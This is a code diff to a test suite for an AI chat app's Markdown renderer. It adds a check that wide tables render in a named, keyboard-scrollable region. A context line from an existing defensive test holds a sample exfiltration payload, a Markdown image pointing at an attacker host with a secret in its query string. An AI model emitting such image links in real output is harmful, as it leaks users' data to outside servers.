@@ -47,6 +47,22 @@ function renderModelMarkdown(markdown: string) {
 }
 
 describe('ai chat Markdown trust boundary', () => {
+  it('keeps wide GFM tables reachable in a named keyboard-scrollable region', async () => {
+    const { container } = renderModelMarkdown([
+      '| Concept | Example | Common mistake | Next step |',
+      '| --- | --- | --- | --- |',
+      '| Very long concept name | Very long example | Very long mistake | Very long next step |',
+    ].join('\n'))
+
+    const scrollRegion = await screen.findByRole('region', {
+      name: '滚动查看完整表格',
+    })
+    expect(scrollRegion.getAttribute('tabindex')).toBe('0')
+    expect(scrollRegion.className).toContain('overflow-x-auto')
+    expect(scrollRegion.querySelector('table')).toBe(container.querySelector('table'))
+    expect(scrollRegion.querySelector('table')?.className).toContain('w-max')
+  })
+
   it('does not create resource-loading elements from model-generated Markdown', async () => {
     const { container } = renderModelMarkdown([
       '![tracking pixel](https://attacker.invalid/pixel?workspace=secret)',
